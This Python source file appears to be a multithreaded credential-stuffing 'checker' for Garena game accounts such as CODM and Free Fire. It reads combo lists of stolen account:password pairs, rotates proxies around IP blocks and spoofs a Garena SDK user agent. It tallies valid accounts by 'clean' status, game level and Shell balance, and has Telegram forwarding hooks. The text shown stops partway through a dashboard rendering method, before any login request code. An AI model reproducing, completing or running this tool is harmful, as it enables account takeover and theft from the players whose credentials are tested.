import io
import os
import re
import sys
import time
import json
import uuid
import base64
import hashlib
import logging
import random
import shutil
import signal
import socket
import threading
import urllib.parse
from collections import deque
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path
from threading import Lock, Event, Thread
from typing import Any, List, Optional, Dict, Tuple

import colorama
from colorama import Fore as _F, Style as _S
import requests
from Crypto.Cipher import AES

from rich import print as rprint
from rich import box
from rich.align import Align
from rich.box import Box, DOUBLE, HEAVY, ROUNDED
from rich.columns import Columns
from rich.console import Console
from rich.layout import Layout
from rich.live import Live
from rich.padding import Padding
from rich.panel import Panel
from rich.progress import (
    BarColumn,
    MofNCompleteColumn,
    Progress,
    SpinnerColumn,
    TextColumn,
    TimeElapsedColumn,
    TimeRemainingColumn,
)
from rich.prompt import Confirm
from rich.rule import Rule
from rich.table import Table
from rich.text import Text

card = ROUNDED

try:
    import pyfiglet as pyfig
    fig = True
except ImportError:
    fig = False

colorama.init(autoreset=True)

def tint(ch, r1, g1, b1, r2, g2, b2, t):
    r = int(r1 + (r2 - r1) * t)
    g = int(g1 + (g2 - g1) * t)
    b = int(b1 + (b2 - b1) * t)
    return f'\033[38;2;{r};{g};{b}m{ch}\033[0m'

def shade(text, r1=180, g1=0, b1=255, r2=255, g2=80, b2=200):
    n = max(len(text) - 1, 1)
    return ''.join(
        tint(ch, r1, g1, b1, r2, g2, b2, i / n)
        for i, ch in enumerate(text)
    )

ver = '\033[38;2;255;200;80m'
by = '\033[38;2;160;160;160m'
at = '\033[38;2;255;80;200m'

console = Console()
disk = shutil

cy = _F.CYAN + _S.BRIGHT
gn = _F.GREEN + _S.BRIGHT
rd = _F.RED + _S.BRIGHT
yl = _F.YELLOW + _S.BRIGHT
mg = _F.MAGENTA + _S.BRIGHT
wh = _F.WHITE + _S.BRIGHT
blu = _F.BLUE + _S.BRIGHT
dim = _S.DIM
rst = _S.RESET_ALL
brt = _S.BRIGHT
itl = "\033[3m"
sl = "\033[38;5;240m"
gr = "\033[38;5;114m"
gd = "\033[38;5;222m"
p = 'bold bright_magenta'
s = 'bold bright_magenta'
ok = 'bold bright_green'
er = 'bold bright_red'
wn = 'bold yellow'
mu = 'dim'
tx = 'bright_white'
bl = 'magenta'

def span():
    return disk.get_terminal_size((80, 24)).columns

def measure(n=72):
    return min(span() - 4, n)

def stamp():
    return datetime.now().strftime('%H:%M:%S')

def gauge(text):
    return len(re.sub(r'\x1b\[[0-9;]*m', '', str(text)))

def sieve(text):
    return re.sub(r'\[/?[^\]]+\]', '', str(text))

def herald(level: str, msg: str, indent: str = '  '):
    col, icon = icons.get(level, (dim, '·'))
    clean = sieve(msg)
    print(f'{indent}{col}{icon}{rst}  {clean}')

icons = {
    'INFO': (cy, 'ℹ'),
    'SUCCESS': (gn, '✔'),
    'WARNING': (yl, '⚠'),
    'ERROR': (rd, '✖'),
    'DEBUG': (dim, '·'),
    'REQUEST': (cy, '→'),
    'RESPONSE': (cy, '←'),
    'RETRY': (yl, '↺'),
    'PROXY': (mg, '⬡'),
    'THREAD': (mg, '⧫'),
    'SAVE': (gn, '⬇')
}

threads = {
    '1': {'threads': 1, 'label': '1  thread   — Safe, slower', 'icon': ''},
    '2': {'threads': 3, 'label': '3  threads  — Balanced', 'icon': ''},
    '3': {'threads': 5, 'label': '5  threads  — Fast', 'icon': ''},
    '4': {'threads': 10, 'label': '10 threads  — Very fast', 'icon': ''},
    '5': {'threads': 15, 'label': '15 threads  — Max speed', 'icon': ''}
}

telegram = False
teleconfig = None
harvest = False
bulk = 'full'
scrolllock = threading.Lock()
scrolllines = deque(maxlen=500)
dashlock = threading.Lock()
active = None

def stream(line: str):
    with scrolllock:
        scrolllines.append(line)
    sys.stdout.write(line + '\n')
    sys.stdout.flush()

regions = {
    'BN': {'name': 'Brunei', 'code': '673'},
    'KH': {'name': 'Cambodia', 'code': '855'},
    'HK': {'name': 'Hong Kong', 'code': '852'},
    'ID': {'name': 'Indonesia', 'code': '62'},
    'LA': {'name': 'Laos', 'code': '856'},
    'MO': {'name': 'Macau', 'code': '853'},
    'MY': {'name': 'Malaysia', 'code': '60'},
    'MM': {'name': 'Myanmar', 'code': '95'},
    'PH': {'name': 'Philippines', 'code': '63'},
    'SG': {'name': 'Singapore', 'code': '65'},
    'TW': {'name': 'Taiwan', 'code': '886'},
    'TH': {'name': 'Thailand', 'code': '66'}
}

def forge(pool=8):
    s = requests.Session()
    adapter = requests.adapters.HTTPAdapter(
        pool_connections=pool,
        pool_maxsize=pool,
        max_retries=0,
        pool_block=False
    )
    s.mount('http://', adapter)
    s.mount('https://', adapter)
    return s

def scrub(text):
    if not text or text == 'N/A':
        return text
    try:
        return text.encode('ascii', errors='ignore').decode('ascii')
    except:
        return re.sub('[^\\x00-\\x7F]+', '', str(text))

def pare(line):
    if not line:
        return (None, None)
    line = line.strip().lstrip('\ufeff\ufffe')
    line = ''.join((char for char in line if char.isprintable() or char == ':'))
    if ':' not in line:
        return (None, None)
    try:
        parts = line.split(':', 1)
        if len(parts) != 2:
            return (None, None)
        account = parts[0].strip()
        password = parts[1].strip()
        account = scrub(account)
        password = scrub(password)
        if not account or not password:
            return (None, None)
        return (account, password)
    except:
        return (None, None)

def label(region_code):
    if not region_code or region_code == 'N/A':
        return 'N/A'
    region_code = region_code.upper()
    region_info = regions.get(region_code)
    if region_info:
        return f"{region_info['name']} ({region_code})"
    return f'{region_code}'

def mask(mobile_no, country_code=None):
    if not mobile_no or mobile_no == 'N/A' or (not str(mobile_no).strip()):
        return 'N/A'
    mobile_str = str(mobile_no).strip()
    mobile_str = mobile_str.replace('+', '').replace(' ', '').replace('-', '')
    if country_code:
        country_code = str(country_code).strip()
        if not mobile_str.startswith(country_code):
            if mobile_str.startswith('0'):
                mobile_str = country_code + mobile_str[1:]
            else:
                mobile_str = country_code + mobile_str
    detected_country_code = None
    for code_key, region_info in regions.items():
        code = region_info['code']
        if mobile_str.startswith(code):
            detected_country_code = code
            break
    if detected_country_code:
        local_number = mobile_str[len(detected_country_code):]
        if len(local_number) >= 4:
            masked = '*' * (len(local_number) - 4) + local_number[-4:]
            return f'+{detected_country_code} {masked}'
        return f'+{detected_country_code} {local_number}'
    if len(mobile_str) >= 4:
        masked = '*' * (len(mobile_str) - 4) + mobile_str[-4:]
        return f'+{masked}'
    return mobile_str

def sever(sig, frame):
    print(f'\n  {yl}⚠  Ctrl+C – exiting immediately…{rst}')
    os._exit(0)

signal.signal(signal.SIGINT, sever)

class Inker(logging.Formatter):
    COLORS = {
        'DEBUG': colorama.Fore.CYAN,
        'INFO': colorama.Fore.CYAN,
        'WARNING': colorama.Fore.YELLOW,
        'ERROR': colorama.Fore.RED,
        'CRITICAL': colorama.Fore.RED + colorama.Back.BLACK + colorama.Style.BRIGHT
    }
    ICONS = {
        'DEBUG': '⊡',
        'INFO': 'ℹ',
        'WARNING': '⚠',
        'ERROR': '✖',
        'CRITICAL': '☠'
    }
    RESET = colorama.Style.RESET_ALL

    def format(self, record):
        levelname = record.levelname
        color = self.COLORS.get(levelname, '')
        icon = self.ICONS.get(levelname, '·')
        tag = f'{levelname:<8}'
        if color:
            record.msg = f'{color}{icon} {tag}{self.RESET} {record.msg}'
        return super().format(record)

logger = logging.getLogger()
handler = logging.StreamHandler()
handler.setFormatter(Inker())
logger.addHandler(handler)
logger.setLevel(logging.INFO)
logging.getLogger('urllib3').setLevel(logging.ERROR)
logging.getLogger('requests').setLevel(logging.ERROR)

default = 5
other = False

maps = {
    'CODM': 'CODM.txt',
    'FREEFIRE': 'FreeFire.txt',
    'FREE FIRE': 'FreeFire.txt',
    'ROV': 'ROV.txt',
    'DELTA FORCE': 'DeltaForce.txt',
    'AOV': 'AOV.txt',
    'SPEED DRIFTERS': 'SpeedDrifters.txt',
    'BLACK CLOVER M': 'BlackCloverM.txt',
    'GARENA UNDAWN': 'Undawn.txt',
    'FC ONLINE': 'FCOnline.txt',
    'FC ONLINE M': 'FCOnlineM.txt',
    'MOONLIGHT BLADE': 'MoonlightBlade.txt',
    'FAST THRILL': 'FastThrill.txt',
    'THE WORLD OF WAR': 'WorldOfWar.txt'
}

names = [
    ('CODM', 'CODM'),
    ('FREEFIRE', 'Free Fire'),
    ('ROV', 'ROV'),
    ('DELTA FORCE', 'Delta Force'),
    ('AOV', 'AOV'),
    ('SPEED DRIFTERS', 'Speed Drifters'),
    ('BLACK CLOVER M', 'Black Clover M'),
    ('GARENA UNDAWN', 'Undawn'),
    ('FC ONLINE', 'FC Online'),
    ('FC ONLINE M', 'FC Online M'),
    ('MOONLIGHT BLADE', 'Moonlight Blade'),
    ('FAST THRILL', 'Fast Thrill'),
    ('THE WORLD OF WAR', 'World of War')
]

retries = 3
delay = 2

ua = (
    "Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 "
    "Mobile Safari/537.36; GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)"
)

chua = '"Not(A:Brand";v="8", "Chromium";v="144", "Android WebView";v="144"'

class Vault:

    def __init__(self, combo_folder='Combo'):
        self.combo_folder = Path(combo_folder)
        self.combo_folder.mkdir(exist_ok=True)
        self.lock = threading.Lock()

    def scan(self):
        return list(self.combo_folder.glob('*.txt'))

    def probe(self, file_path):
        file_path = Path(file_path)
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [
                    line.strip()
                    for line in f
                    if line.strip() and ':' in line
                ]
                count = len(lines)
            size = file_path.stat().st_size
            return {
                'name': file_path.name,
                'path': str(file_path),
                'size': size,
                'sized': self.scale(size),
                'count': count
            }
        except Exception:
            logger.error(f'Error reading file {file_path}')
            return None

    def scale(self, size):
        for unit in ['B', 'KB', 'MB', 'GB']:
            if size < 1024.0:
                return f'{size:.2f} {unit}'
            size /= 1024.0
        return f'{size:.2f} TB'

    def cleanse(self, file_path):
        file_path = Path(file_path)
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
            cleaned = []
            invalid = 0
            for line in lines:
                account, password = pare(line)
                if account and password:
                    cleaned.append(f'{account}:{password}\n')
                else:
                    invalid += 1
            with open(file_path, 'w', encoding='utf-8') as f:
                f.writelines(cleaned)
            return (len(cleaned), invalid)
        except Exception:
            logger.error('Error cleaning file encoding')
            return (0, 0)

    def dedupe(self, file_path, overwrite=True):
        file_path = Path(file_path)
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [line.strip() for line in f if line.strip()]
            before = len(lines)
            unique = list(dict.fromkeys(lines))
            removed = before - len(unique)
            if overwrite:
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(unique))
            else:
                new_path = file_path.parent / f'{file_path.stem}_cleaned.txt'
                with open(new_path, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(unique))
            return removed
        except Exception:
            logger.error('Error cleaning duplicates')
            return 0

    def excise(self, file_path, line_to_remove):
        try:
            file_path = Path(file_path)
            target = line_to_remove.strip()
            with self.lock:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = f.readlines()
                with open(file_path, 'w', encoding='utf-8') as f:
                    for line in lines:
                        if line.strip() != target:
                            f.write(line)
            return True
        except Exception:
            logger.error('Error removing line')
            return False

class Lens:
    def __init__(self):
        self.console = Console()

    def board(self, file_infos):
        print()
        table = Table(
            box=box.HORIZONTALS,
            header_style="bold bright_magenta",
            border_style="bright_magenta",
            padding=(0, 2)
        )
        table.add_column("#", style="bright_magenta", justify="center")
        table.add_column("Filename", style="bold white")
        table.add_column("Size", style="white", justify="right")
        table.add_column("Accounts", style="white", justify="right")
        table.add_column("Bar", style="bright_magenta")
        max_ac = max((i['count'] for i in file_infos)) if file_infos else 1
        for idx, info in enumerate(file_infos, 1):
            bar_w = 16
            filled = int(info['count'] / max_ac * bar_w)
            bar = (
                f"[bright_magenta]{'█' * filled}[/bright_magenta]"
                f"[dim white]{'░' * (bar_w - filled)}[/dim white]"
            )
            table.add_row(
                str(idx),
                info['name'],
                info['sized'],
                f"{info['count']:,}",
                bar
            )
        panel = Panel(
            table,
            title="[bold white]COMBO FILES[/bold white]",
            box=box.DOUBLE_EDGE,
            border_style="bright_magenta",
            expand=False
        )
        self.console.print(Padding(panel, (0, 0, 0, 4)))
        print()

    def choose(self, file_infos):
        while True:
            prompt_panel = Panel(
                "[white]Enter file number or 'auto'[/white]",
                title="[bright_magenta]❯ Input[/bright_magenta]",
                border_style="bright_magenta",
                box=box.ROUNDED,
                expand=False
            )
            self.console.print(Padding(prompt_panel, (0, 0, 0, 4)))
            choice = input("        ❯ ").strip().lower()
            if choice == 'auto':
                largest = max(file_infos, key=lambda x: x['count'])
                herald('SUCCESS', f"Auto-selected: {largest['name']}", '    ')
                return largest['path']
            try:
                idx = int(choice)
                if 1 <= idx <= len(file_infos):
                    return file_infos[idx - 1]['path']
                herald('ERROR', 'Invalid number — try again.', '    ')
            except ValueError:
                herald('ERROR', "Enter a number or 'auto'.", '    ')

    def ask_clean(self):
        print()
        prompt_panel = Panel(
            "[white]Clean file encoding? (y/n) [default: y][/white]",
            title="[bright_magenta]❯ Question[/bright_magenta]",
            border_style="bright_magenta",
            box=box.ROUNDED,
            expand=False
        )
        self.console.print(Padding(prompt_panel, (0, 0, 0, 4)))
        choice = input("        ❯ ").strip().lower()
        return choice != 'n'

    def ask_dedupe(self):
        prompt_panel = Panel(
            "[white]Remove duplicate lines? (y/n) [default: n][/white]",
            title="[bright_magenta]❯ Question[/bright_magenta]",
            border_style="bright_magenta",
            box=box.ROUNDED,
            expand=False
        )
        self.console.print(Padding(prompt_panel, (0, 0, 0, 4)))
        choice = input("        ❯ ").strip().lower()
        return choice == 'y'

    def ask_auto(self):
        prompt_panel = Panel(
            "[white]Auto-remove checked lines? (y/n) [default: n][/white]",
            title="[bright_magenta]❯ Question[/bright_magenta]",
            border_style="bright_magenta",
            box=box.ROUNDED,
            expand=False
        )
        self.console.print(Padding(prompt_panel, (0, 0, 0, 4)))
        choice = input("        ❯ ").strip().lower()
        return choice == 'y'

class Ledger:
    def __init__(self):
        self.valid = 0
        self.invalid = 0
        self.clean = 0
        self.unclean = 0
        self.codm = 0
        self.nocodm = 0
        self.error = 0
        self.tclean = 0
        self.tunclean = 0
        self.tshell = 0
        self.cleans = {'351-400': 0, '201-350': 0, '101-200': 0, '1-100': 0}
        self.uncleans = {'351-400': 0, '201-350': 0, '101-200': 0, '1-100': 0}
        self.lock = threading.Lock()
        self.started = time.time()
        self.total = 0
        self.games = {k: 0 for k, _ in names}
        self.results = deque(maxlen=200)

    def accrue(self, valid=False, clean=False, has_codm=False, is_error=False, codm_level=0, game_connections=None, shell=0):
        with self.lock:
            if is_error:
                self.error += 1
            elif valid:
                self.valid += 1
                if clean:
                    self.clean += 1
                    if codm_level > self.tclean:
                        self.tclean = codm_level
                    if has_codm and codm_level > 0:
                        if codm_level <= 100:
                            self.cleans['1-100'] += 1
                        elif codm_level <= 200:
                            self.cleans['101-200'] += 1
                        elif codm_level <= 350:
                            self.cleans['201-350'] += 1
                        else:
                            self.cleans['351-400'] += 1
                else:
                    self.unclean += 1
                    if has_codm and codm_level > 0:
                        if codm_level > self.tunclean:
                            self.tunclean = codm_level
                        if codm_level <= 100:
                            self.uncleans['1-100'] += 1
                        elif codm_level <= 200:
                            self.uncleans['101-200'] += 1
                        elif codm_level <= 350:
                            self.uncleans['201-350'] += 1
                        else:
                            self.uncleans['351-400'] += 1
                if has_codm:
                    self.codm += 1
                else:
                    self.nocodm += 1
                try:
                    if int(shell or 0) > self.tshell:
                        self.tshell = int(shell or 0)
                except:
                    pass
                for g in game_connections or []:
                    gname = g.get('game', '').upper()
                    if gname == 'FREE FIRE':
                        gname = 'FREEFIRE'
                    if gname in self.games:
                        self.games[gname] += 1
            else:
                self.invalid += 1

    def snapshot(self):
        with self.lock:
            return {
                'valid': self.valid,
                'invalid': self.invalid,
                'clean': self.clean,
                'not_clean': self.unclean,
                'has_codm': self.codm,
                'no_codm': self.nocodm,
                'error': self.error,
                'highest_clean_level': self.tclean,
                'clean_level_counts': dict(self.cleans),
                'not_clean_level_counts': dict(self.uncleans),
                'game_counts': dict(self.games),
                'highest_shell': self.tshell
            }

    def tally(self):
        with self.lock:
            return self.valid + self.invalid + self.error

    def push(self, success: bool, is_clean: bool = False, has_codm: bool = False, codm_level: int = 0, error_reason: str = '', shell_balance: int = 0):
        with self.lock:
            self.results.append({
                'success': success,
                'is_clean': is_clean,
                'has_codm': has_codm,
                'codm_level': codm_level,
                'error_reason': error_reason,
                'shell_balance': shell_balance
            })

    def pop(self):
        with self.lock:
            return self.results.popleft() if self.results else None

    def bar(self, count: int, denom: int, color: str, width: int = 20) -> Text:
        if denom == 0:
            return Text("░" * width, style="dim")
        filled = int(count / denom * width)
        b = Text()
        b.append("█" * filled, style=color)
        b.append("░" * (width - filled), style="dim")
        return b

    def percent(self, count: int, denom: int) -> str:
        return f"{count / denom * 100:.1f}%" if denom > 0 else "0.0%"

    def report(self):
        stats = self.snapshot()
        processed = self.tally()
        if processed == 0:
            return ''
        elapsed = time.time() - self.started
        rate = processed / elapsed if elapsed > 0 else 0
        remaining = self.total - processed
        eta = remaining / rate if rate > 0 else 0
        pct = processed / self.total * 100 if self.total > 0 else 0
        bar_w = 30
        filled = int(pct / 100 * bar_w)
        prog_bar = (
            f"[bright_cyan]{'█' * filled}[/bright_cyan]"
            f"[dim]{'░' * (bar_w - filled)}[/dim]"
        )

        def _mb(count, total, color, w=12):
            if total == 0:
                return f"[dim]{'░' * w}[/dim]"
            f2 = int(count / total * w)
            return f"[{color}]{'█' * f2}{'░' * (w - f2)}[/{color}]"

        tbl = Table(show_header=False, box=None, padding=(0, 1), expand=False)
        tbl.add_column(style='dim', min_width=6, no_wrap=True)
        tbl.add_column(style='bright_white', min_width=8, no_wrap=True, justify='right')
        tbl.add_column(style='dim', min_width=14, no_wrap=True)
        tbl.add_row(
            f'[bright_cyan]{prog_bar}[/bright_cyan]',
            f'[bold bright_yellow]{pct:.1f}%[/bold bright_yellow]',
            f'[dim]{processed}/{self.total}  ·  {rate:.1f}/s  ·  ETA {int(eta // 60)}m{int(eta % 60)}s[/dim]'
        )
        tbl.add_row('', '', '')
        total_c = stats['valid'] + stats['invalid']
        tbl.add_row(
            f'[bright_green]✔ Valid[/bright_green]',
            f"[bright_green]{stats['valid']}[/bright_green]",
            _mb(stats['valid'], total_c, 'bright_magenta')
        )
        tbl.add_row(
            f'[bright_red]✖ Invalid[/bright_red]',
            f"[bright_red]{stats['invalid']}[/bright_red]",
            _mb(stats['invalid'], total_c, 'bright_red')
        )
        tbl.add_row(
            f'[bright_green]✨ Clean[/bright_green]',
            f"[bright_green]{stats['clean']}[/bright_green]",
            _mb(stats['clean'], max(stats['valid'], 1), 'bright_magenta')
        )
        tbl.add_row(
            f'[yellow]⊘ Not Clean[/yellow]',
            f"[yellow]{stats['not_clean']}[/yellow]",
            _mb(stats['not_clean'], max(stats['valid'], 1), 'yellow')
        )
        tbl.add_row(
            f'[bright_cyan]◈ CODM[/bright_cyan]',
            f"[bright_cyan]{stats['has_codm']}[/bright_cyan]",
            _mb(stats['has_codm'], max(stats['valid'], 1), 'bright_magenta')
        )
        tbl.add_row(
            f'[dim]○ No CODM[/dim]',
            f"[dim]{stats['no_codm']}[/dim]",
            _mb(stats['no_codm'], max(stats['valid'], 1), 'magenta')
        )
        tbl.add_row('', '', '')
        tbl.add_row(
            f'[dim]▲ Top Clean Lv[/dim]',
            f"[bold bright_green]{stats['highest_clean_level']}[/bold bright_green]",
            ''
        )
        tbl.add_row(
            f'[dim]▲ Top Not Clean Lv[/dim]',
            f'[bold yellow]{self.tunclean}[/bold yellow]',
            ''
        )
        hs = stats.get('highest_shell', 0)
        hs_color = 'bold bright_yellow' if hs > 0 else 'dim'
        tbl.add_row(
            f'[dim]◆ Shell[/dim]',
            f'[{hs_color}]{hs:,}[/{hs_color}]',
            ''
        )
        gc = stats.get('game_counts', {})
        active_games = [
            (label_name, gc.get(key, 0))
            for key, label_name in names
            if gc.get(key, 0) > 0
        ]
        if active_games:
            tbl.add_row('', '', '')
            for label_name, count in active_games:
                tbl.add_row(
                    f'[dim]{label_name}[/dim]',
                    f'[bold bright_magenta]{count}[/bold bright_magenta]',
                    ''
                )
        return Panel(
            tbl,
            title='[bold bright_magenta]◈ [/bold bright_magenta][bold bright_cyan]rriellqt[/bold bright_cyan][bold bright_magenta] ◈[/bold bright_magenta]',
            border_style='bright_magenta',
            box=DOUBLE,
            padding=(0, 2)
        )

    def finish(self):
        stats = self.snapshot()
        elapsed = time.time() - self.started
        total = self.total
        proc = self.tally()
        rate = proc / elapsed if elapsed > 0 else 0
        c = Console()

        results_table = Table(
            title="[bold bright_cyan]◈ SESSION COMPLETE[/bold bright_cyan]",
            title_style="bold bright_cyan",
            box=DOUBLE,
            border_style="bright_cyan",
            show_header=True,
            header_style="bold dim",
            padding=(0, 2),
            expand=False
        )
        results_table.add_column("Category", style="dim", no_wrap=True, width=14)
        results_table.add_column("Count", justify="right", style="bright_white", width=10)
        results_table.add_column("Pct", justify="right", style="bright_yellow", width=8)
        results_table.add_column("Bar", no_wrap=True)

        denom = max(total, 1)
        rows = [
            ("✔  Valid", stats['valid'], "bright_green"),
            ("✖  Invalid", stats['invalid'], "bright_red"),
            ("·  Errors", stats['error'], "dim")
        ]
        for label_name, count, color in rows:
            results_table.add_row(
                f"[{color}]{label_name}[/{color}]",
                f"[{color}]{count:,}[/{color}]",
                self.percent(count, denom),
                self.bar(count, denom, color, 20)
            )
        results_table.add_row("", "", "", "")

        vd = max(stats['valid'], 1)
        rows2 = [
            ("✨  Clean", stats['clean'], "bright_green"),
            ("⊘  Not Clean", stats['not_clean'], "bright_yellow"),
            ("◈  Has CODM", stats['has_codm'], "bright_cyan"),
            ("○  No CODM", stats['no_codm'], "magenta")
        ]
        for label_name, count, color in rows2:
            results_table.add_row(
                f"[{color}]{label_name}[/{color}]",
                f"[{color}]{count:,}[/{color}]",
                self.percent(count, vd),
                self.bar(count, vd, color, 20)
            )

        c.print(Panel(results_table, border_style="bright_cyan", box=HEAVY, padding=(0, 1)))

        stats_table = Table(
            title="[bold bright_yellow]◈ SESSION STATS[/bold bright_yellow]",
            box=ROUNDED,
            border_style="bright_yellow",
            show_header=False,
            padding=(0, 2),
            expand=False
        )
        stats_table.add_column(style="dim", width=16, no_wrap=True)
        stats_table.add_column(style="bright_white", no_wrap=True)

        hs = stats.get('highest_shell', 0)
        hs_style = "bold bright_yellow" if hs > 0 else "dim"
        clean_lvl_style = "bold bright_green" if stats['highest_clean_level'] > 0 else "dim"
        not_clean_lvl_style = "bold bright_yellow" if self.tunclean > 0 else "dim"

        rows3 = [
            ("⏱  Time", f"{int(elapsed // 60)}m {int(elapsed % 60)}s"),
            ("⚡  Rate", f"{rate:.2f} acc/s"),
            ("◈  Processed", f"{proc:,}/{total:,}"),
            ("▲  Top Clean", f"[{clean_lvl_style}]{stats['highest_clean_level']}[/{clean_lvl_style}]"),
            ("▲  Top Not Clean", f"[{not_clean_lvl_style}]{self.tunclean}[/{not_clean_lvl_style}]"),
            ("◆  Peak Shell", f"[{hs_style}]{hs:,}[/{hs_style}]")
        ]
        for label_name, val in rows3:
            stats_table.add_row(label_name, val)

        level_table = Table(
            title="[bold bright_magenta]◈ LEVEL RANGES[/bold bright_magenta]",
            box=ROUNDED,
            border_style="bright_magenta",
            show_header=True,
            header_style="bold dim",
            padding=(0, 1),
            expand=False
        )
        level_table.add_column("Range", style="dim", no_wrap=True, width=10)
        level_table.add_column("Clean", justify="right", style="bright_green", width=8)
        level_table.add_column("Bar", no_wrap=True)
        level_table.add_column("Not Clean", justify="right", style="bright_yellow", width=8)
        level_table.add_column("Bar", no_wrap=True)

        clean_lvl = stats['clean_level_counts']
        not_clean_lvl = stats['not_clean_level_counts']
        ct = max(stats['clean'], 1)
        nt = max(stats['not_clean'], 1)

        for rng in ['351-400', '201-350', '101-200', '1-100']:
            cc = clean_lvl.get(rng, 0)
            nc = not_clean_lvl.get(rng, 0)
            level_table.add_row(
                f"[dim]Lv {rng}[/dim]",
                f"{cc:,}",
                self.bar(cc, ct, "bright_green", 12),
                f"{nc:,}",
                self.bar(nc, nt, "bright_yellow", 12)
            )

        stats_levels = Columns(
            [stats_table, level_table],
            expand=False,
            equal=False,
            padding=(0, 2)
        )
        c.print(Panel(stats_levels, border_style="bright_yellow", box=ROUNDED, padding=(0, 1)))

        gc = stats.get('game_counts', {})
        active_games = [
            (label_name, gc.get(key, 0))
            for key, label_name in names
            if gc.get(key, 0) > 0
        ]

        if active_games:
            games_table = Table(
                title="[bold bright_cyan]◈ GAMES FOUND[/bold bright_cyan]",
                box=ROUNDED,
                border_style="bright_cyan",
                show_header=True,
                header_style="bold dim",
                padding=(0, 2),
                expand=False
            )
            games_table.add_column("Game", style="dim", no_wrap=True, width=24)
            games_table.add_column("Count", justify="right", style="bright_white", width=8)
            games_table.add_column("Bar", no_wrap=True)
            peak = max(count for _, count in active_games) or 1
            for label_name, count in active_games:
                games_table.add_row(
                    f"[dim]{label_name}[/dim]",
                    f"[bright_cyan]{count:,}[/bright_cyan]",
                    self.bar(count, peak, "bright_cyan", 16)
                )
            c.print(Panel(games_table, border_style="bright_cyan", box=ROUNDED, padding=(0, 1)))

        footer_text = Text()
        footer_text.append("⬡  Powered by @rriellqt", style="magenta bold")
        c.print(Panel(Align.center(footer_text), border_style="magenta", box=ROUNDED, padding=(0, 1)))
        c.print()

class Deck:
    def __init__(self, total_accounts: int, max_threads: int = 1):
        self.total = total_accounts
        self.done = 0
        self.valid = 0
        self.invalid = 0
        self.error = 0
        self.clean = 0
        self.not_clean = 0
        self.codm_present = 0
        self.no_codm = 0
        self.start_time = time.time()
        self.ip_blocked = False
        self.proxy_mode = False
        self.active_threads = max_threads
        self.max_threads = max_threads
        self.highest_clean_level = 0
        self.highest_clean_shell = 0
        self.highest_nc_level = 0
        self.highest_overall_level = 0
        self.current_proxy = None
        self.current_proxy_line = None
        self._lock = threading.Lock()
        self._snap = {}
        self._was_rendered = False
        self.refresh()

    def start(self):
        global active
        active = self
        with dashlock:
            sys.stdout.write(self.render() + '\n')
            sys.stdout.flush()
        self._was_rendered = True

    def stop(self):
        global active
        active = None

    def record_start(self, index: int, account: str):
        pass

    def set_current_proxy(self, proxy: str = None, line: int = None):
        with self._lock:
            if proxy:
                self.current_proxy = proxy
            if line is not None:
                self.current_proxy_line = line

    def set_cooldown(self, seconds: float):
        pass

    def set_ip_blocked(self, blocked: bool):
        with self._lock:
            self.ip_blocked = blocked

    def set_active_threads(self, n: int, ramp_mode: bool = False):
        with self._lock:
            self.active_threads = n

    def record(self, index: int, account: str, success: bool,
               is_clean: bool = False, has_codm: bool = False,
               codm_level: int = 0, shell_balance: int = 0,
               error_reason: str = ''):
        with self._lock:
            self.done += 1
            if success:
                self.valid += 1
                if is_clean:
                    self.clean += 1
                    if codm_level > self.highest_clean_level:
                        self.highest_clean_level = codm_level
                    if shell_balance > self.highest_clean_shell:
                        self.highest_clean_shell = shell_balance
                else:
                    self.not_clean += 1
                    if codm_level > self.highest_nc_level:
                        self.highest_nc_level = codm_level
                if has_codm:
                    self.codm_present += 1
                    if codm_level > self.highest_overall_level:
                        self.highest_overall_level = codm_level
                else:
                    self.no_codm += 1
            else:
                self.invalid += 1
            self.refresh()
        self.emit(account, success, is_clean, has_codm, codm_level, shell_balance, error_reason)

    def emit(self, account, success, is_clean, has_codm, codm_level, shell, error_reason):
        m = bulk
        lines_to_print = []
        if m != 'full':
            if not success:
                if m == 'none':
                    lines_to_print.append(f'  {rd}INVALID{rst}  {dim}{account}{rst}\n')
                else:
                    reason = error_reason or 'Invalid'
                    lines_to_print.append(f'  {rd}INVALID{rst}  {dim}{account}{rst}  {dim}{reason}{rst}\n')
            else:
                if m == 'none':
                    lines_to_print.append(f'  {gn}VALID{rst}  {wh}{account}{rst}\n')
                elif m == 'semi':
                    lvl_c = cy if codm_level >= 200 else wh
                    clean_s = f'{gn}CLEAN{rst}' if is_clean else f'{yl}NOT CLEAN{rst}'
                    shell_s = f'{yl}Shell:{shell:,}{rst}' if shell > 0 else ''
                    parts = [f'{gn}VALID{rst}', f'{lvl_c}Lv{codm_level}{rst}' if has_codm else f'{dim}No CODM{rst}', clean_s]
                    if shell_s:
                        parts.append(shell_s)
                    lines_to_print.append('  ' + '  '.join(parts) + f'  {dim}{account}{rst}\n')

        with dashlock:
            if self._was_rendered:
                dash_str = self.render()
                dash_lines = dash_str.count('\n') + 1
                sys.stdout.write(f'\x1b[{dash_lines}A\x1b[0J')

            for line in lines_to_print:
                sys.stdout.write(line)
            sys.stdout.write(self.render() + '\n')
            sys.stdout.flush()

    def refresh(self):
        elapsed = time.time() - self.start_time
        done = self.done
        rate = done / elapsed if elapsed > 0 else 0
        cpm = rate * 1000
        eta_s = (self.total - done) / rate if rate > 0 and done < self.total else 0
        self._snap = {
            'done': done, 'total': self.total,
            'valid': self.valid, 'invalid': self.invalid, 'error': self.error,
            'clean': self.clean, 'not_clean': self.not_clean,
            'codm': self.codm_present, 'no_codm': self.no_codm,
            'rate': rate, 'cpm': cpm, 'elapsed': elapsed, 'eta': eta_s,
            'threads': self.active_threads, 'max_threads': self.max_threads,
            'ip_blocked': self.ip_blocked,
            'hcl': self.highest_clean_level, 'hcs': self.highest_clean_shell,
            'hnl': self.highest_nc_level, 'hol': self.highest_overall_level,
        }

    def render(self) -> str:
        with self._lock:
            s = dict(self._snap)
        if not s:
            return ''

        done = s['done']
        total = s['total']
